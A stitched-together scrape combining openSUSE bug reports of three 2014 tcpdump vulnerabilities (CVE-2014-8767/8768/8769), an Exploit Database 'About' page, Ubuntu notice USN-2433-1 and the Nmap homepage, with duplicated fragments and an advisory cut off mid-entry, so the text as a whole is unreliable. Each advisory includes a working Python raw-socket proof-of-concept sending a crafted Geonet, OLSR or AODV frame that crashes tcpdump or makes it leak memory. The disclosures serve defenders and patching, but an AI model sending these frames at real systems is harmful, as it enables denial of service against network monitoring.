| [Description](show_bug.cgi?id=905871#c0)  Johannes Segitz   2014-11-18 08:35:39 UTC  ``` CVE-2014-8768 tcpdump denial of service in verbose mode using malformed Geonet payload  1. Background  tcpdump is a powerful command-line packet analyzer. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached.  2. Summary Information  It was found out that malformed network traffic (Geonet-based) can lead to an application crash (denial of service) if verbose output of tcpdump monitoring the network is used.  3. Technical Description  The application decoder for the geonet protocol fails to perform external input validation and performs insufficient checking on length computations leading to an unsafe decrement and underflow in the function  geonet_print(netdissect_options *ndo, const u_char *eth, const u_char *bp, u_int length)  The affected variable is length which is later on used to print a memory chunk which eventually leads to a segfault. The function contains several unsafe computations updating the length variable.  To reproduce start tcpdump on a network interface  sudo tcpdump -i lo -s 0 -n -v  (running the program with sudo might hide the segfault message on certain environments, see dmesg for details)  and use the following python program to generate a frame on the network (might also need sudo):  #!/usr/bin/env python from socket import socket, AF_PACKET, SOCK_RAW s = socket(AF_PACKET, SOCK_RAW) s.bind(("lo", 0))  geonet_frame = "\x00\x1f\xc6\x51\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\xc6\x51\x07\x07\x07\x07\x07\x07\xef\x06\x07\x35\x97\x00\x24\x8c\x7a\xdf\x6f\x08\x00\x45\x00\x00\x3d\xf3\x7f\x40\x00\x40\x11\x30\xc6\x 0a\x01\x01\x68\x0a\x01\x01\x01\x99\x80\x00\x35\x00\x29\x16\xa5\x01\x76\x01\x00\x00\xff\x00\x00\x01\x00\x00\x00"  s.send(geonet_frame)  4. Affected versions  Affected versions are 4.5.0 through 4.6.2  (segfaults were reproducible in versions up to 4.6.1 on Ubuntu 14.04, but not reliably in 4.6.2. Code audit showed that unsafe computations are performed in 4.6.2, but the trigger frame might need to look different).  5. Fix  The problem is fixed in the upcoming version tcpdump 4.7.0  6. Advisory Timeline  2014-11-08 Discovered 2014-11-09 Requested CVE 2014-11-11 Reported vendor by email 2014-11-12 Vendor made a fix available as repository patch 2014-11-13 CVE number received 2014-11-13 Published CVE advisory  7. Credit  The issue was found by  Steffen Bauch Twitter: @steffenbauch <http://steffenbauch.de>  using a slightly enhanced version of american fuzzy lop (<https://code.google.com/p/american-fuzzy-lop/>) created by Michal Zalewski.  SLE 12 and openSUSE 13.2 are affected. ``` [Comment 1](show_bug.cgi?id=905871#c1)  Swamp Workflow Management   2014-11-18 10:32:35 UTC  ``` An update workflow for this issue was started.

| [Description](show_bug.cgi?id=905870#c0)  Johannes Segitz   2014-11-18 08:32:38 UTC  ``` Date: Tue, 18 Nov 2014 06:03:16 +0100 From: Steffen Bauch <mail@steffenbauch.de>  CVE-2014-8767 tcpdump denial of service in verbose mode using malformed OLSR payload  1. Background  tcpdump is a powerful command-line packet analyzer. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached.  2. Summary Information  It was found out that malformed network traffic (OLSR-based) can lead to an application crash (denial of service) if verbose output of tcpdump monitoring the network is used.  3. Technical Description  The application decoder for the OLSR protocol fails to perform external input validation and performs insufficient checking on length computations leading to an unsafe decrement and underflow in the function  olsr_print (const u_char *pptr, u_int length, int is_ipv6)  In this function msg_len is extracted from the input without sufficient checks and subtracted sizeof(struct olsr_msg4) which leads to an underflow of msg_tlen which is used to call olsr_print_neighbor() which will crash. In case DNS reverse lookup is enabled, this will also lead to a large amount of invalid DNS reverse lookups.  To reproduce start tcpdump on a network interface  sudo tcpdump -i lo -s 0 -n -v  (running the program with sudo might hide the segfault message on certain environments, see dmesg for details)  and use the following python program to generate a frame on the network (might also need sudo):  #!/usr/bin/env python from socket import socket, AF_PACKET, SOCK_RAW s = socket(AF_PACKET, SOCK_RAW) s.bind(("lo", 0))  olsr_frame = "\x00\x1b\xc6\x51\x35\x97\x00\x24\x8c\x7a\xff\x6f\x08\x00\x45\x15\x00\x3d\xf3\x7f\x40\x00\x4d\x11\x30\xc6\x0a\x01\x01\x68\x0a\x02\x02\x02\x02\xba\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x 20\x00\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x20\x01\x00\x00\x00"  s.send(olsr_frame)  4. Affected versions Affected versions are 3.9.6 through 4.6.2  5. Fix The problem is fixed in the upcoming version tcpdump 4.7.0  So SLE 11, 12 and all openSUSE variants ``` [Comment 1](show_bug.cgi?id=905870#c1)  Swamp Workflow Management   2014-11-18 10:32:25 UTC  ``` An update workflow for this issue was started.

CVE-2014-8768 tcpdump denial of service in verbose mode using malformed
Geonet payload
```

1. Background

```
tcpdump is a powerful command-line packet analyzer. It allows the user
to intercept and display TCP/IP and other packets being transmitted or
received over a network to which the computer is attached.
```

2. Summary Information

```
It was found out that malformed network traffic (Geonet-based) can lead
to an application crash (denial of service) if verbose output of tcpdump
monitoring the network is used.
```

3. Technical Description

```
The application decoder for the geonet protocol fails to perform
external input validation and performs insufficient checking on length
computations leading to an unsafe decrement and underflow in the function
```

```
geonet\_print(netdissect\_options \*ndo, const u\_char \*eth, const u\_char
\*bp, u\_int length)
```

```
The affected variable is length which is later on used to print a memory
chunk which eventually leads to a segfault. The function contains
several unsafe computations updating the length variable.
```

To reproduce start tcpdump on a network interface

sudo tcpdump -i lo -s 0 -n -v

```
(running the program with sudo might hide the segfault message on
certain environments, see dmesg for details)
```

```
and use the following python program to generate a frame on the network
(might also need sudo):
```

#!/usr/bin/env python
from socket import socket, AF_PACKET, SOCK_RAW
s = socket(AF_PACKET, SOCK_RAW)
s.bind(("lo", 0))

```
geonet\_frame =
"\x00\x1f\xc6\x51\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\xc6\x51\x07\x07\x07\x07\x07\x07\xef\x06\x07\x35\x97\x00\x24\x8c\x7a\xdf\x6f\x08\x00\x45\x00\x00\x3d\xf3\x7f\x40\x00\x40\x11\x30\xc6\x0a\x01\x01\x68\x0a\x01\x01\x01\x99\x80\x00\x35\x00\x29\x16\xa5\x01\x76\x01\x00\x00\xff\x00\x00\x01\x00\x00\x00"
```

s.send(geonet_frame)

4. Affected versions

Affected versions are 4.5.0 through 4.6.2

```
(segfaults were reproducible in versions up to 4.6.1 on Ubuntu 14.04,
but not reliably in 4.6.2. Code audit showed that unsafe computations
are performed in 4.6.2, but the trigger frame might need to look different).
```

5. Fix

The problem is fixed in the upcoming version tcpdump 4.7.0

6. Advisory Timeline

2014-11-08 Discovered
2014-11-09 Requested CVE
2014-11-11 Reported vendor by email
2014-11-12 Vendor made a fix available as repository patch
2014-11-13 CVE number received
2014-11-13 Published CVE advisory

but not reliably in 4.6.2. Code audit showed that unsafe computations
are performed in 4.6.2, but the trigger frame might need to look different).

5. Fix

The problem is fixed in the upcoming version tcpdump 4.7.0

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# USN-2433-1: tcpdump vulnerabilities

4 December 2014

Several security issues were fixed in tcpdump.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 14.10](/security/notices?release=utopic)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)
* [Ubuntu 12.04](/security/notices?release=precise)
* [Ubuntu 10.04](/security/notices?release=lucid)

## Packages

* [tcpdump](/security/cves?package=tcpdump) - command-line network traffic analyzer

## Details

Steffen Bauch discovered that tcpdump incorrectly handled printing OSLR

packets. A remote attacker could use this issue to cause tcpdump to crash,

resulting in a denial of service, or possibly execute arbitrary code.

([CVE-2014-8767](/security/CVE-2014-8767))

Steffen Bauch discovered that tcpdump incorrectly handled printing GeoNet

packets. A remote attacker could use this issue to cause tcpdump to crash,

resulting in a denial of service, or possibly execute arbitrary code. This

issue only applied to Ubuntu 14.04 LTS and Ubuntu 14.10. ([CVE-2014-8768](/security/CVE-2014-8768))

Steffen Bauch discovered that tcpdump incorrectly handled printing AODV

packets. A remote attacker could use this issue to cause tcpdump to crash,

resulting in a denial of service, reveal sensitive information, or possibly

execute arbitrary code. ([CVE-2014-8769](/security/CVE-2014-8769))

It was discovered that tcpdump incorrectly handled printing PPP packets. A

remote attacker could use this issue to cause tcpdump to crash, resulting

in a denial of service, or possibly execute arbitrary code.

([CVE-2014-9140](/security/CVE-2014-9140))

In the default installation, attackers would be isolated by the tcpdump

AppArmor profile.

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 14.10

* [tcpdump](https://launchpad.net/ubuntu/%2Bsource/tcpdump)
  -
  [4.6.2-1ubuntu1.1](https://launchpad.net/ubuntu/%2Bsource/tcpdump/4.6.2-1ubuntu1.1)

##### Ubuntu 14.04

* [tcpdump](https://launchpad.net/ubuntu/%2Bsource/tcpdump)
  -
  [4.5.1-2ubuntu1.1](https://launchpad.net/ubuntu/%2Bsource/tcpdump/4.5.1-2ubuntu1.1)

##### Ubuntu 12.04

* [tcpdump](https://launchpad.net/ubuntu/%2Bsource/tcpdump)
  -
  [4.2.1-1ubuntu2.1](https://launchpad.net/ubuntu/%2Bsource/tcpdump/4.2.1-1ubuntu2.1)

##### Ubuntu 10.04

* [tcpdump](https://launchpad.net/ubuntu/%2Bsource/tcpdump)
  -
  [4.0.0-6ubuntu3.1](https://launchpad.net/ubuntu/%2Bsource/tcpdump/4.0.0-6ubuntu3.1)

In general, a standard system update will make all the necessary changes.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

| [Description](show_bug.cgi?id=905872#c0)  Johannes Segitz   2014-11-18 08:37:27 UTC  ``` CVE-2014-8769 tcpdump unreliable output using malformed AOVD payload  1. Background  tcpdump is a powerful command-line packet analyzer. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached.  2. Summary Information  It was found out that malformed network traffic (AOVD-based) can lead to an abnormal behaviour if verbose output of tcpdump monitoring the network is used.  3. Technical Description  The application decoder for the Ad hoc On-Demand Distance Vector (AODV) protocol fails to perform input validation and performs unsafe out-of-bound accesses. The application will usually not crash, but perform out-of-bounds accesses and output/leak larger amounts of invalid data, which might lead to dropped packets. It is unknown if other payload exists that might trigger segfaults.  To reproduce start tcpdump on a network interface  sudo tcpdump -i lo -s 0 -n -v  (running the program with sudo might hide a possible segfault message on certain environments, see dmesg for details)  and use the following python program to generate a frame on the network (might also need sudo):  #!/usr/bin/env python from socket import socket, AF_PACKET, SOCK_RAW s = socket(AF_PACKET, SOCK_RAW) s.bind(("lo", 0))  aovd_frame = "\x00\x00\x00\x00\x00\x00\x00\x00\x8c\x7a\xdf\x6f\x08\x00\x45\x00\xe6\x3d\xf3\x7f\x40\x00\x40\x11\x30\xc6\x0a\x01\x01\x68\x0a\x02\x02\x02\x02\x8e\x0d\x00\x4b\x00\x00\xe8\x12\x00\x00\x00\x00\x 1f\xc6\x51\x35\x97\x00\x24\x8c\x7a\xdf\x6f\x08\x00\x45\x00\xe6\x3d\xf3\x7f\x40\x00\x40\x11\x30\xc6\x0a\x01\x01"  s.send(aovd_frame)  4.
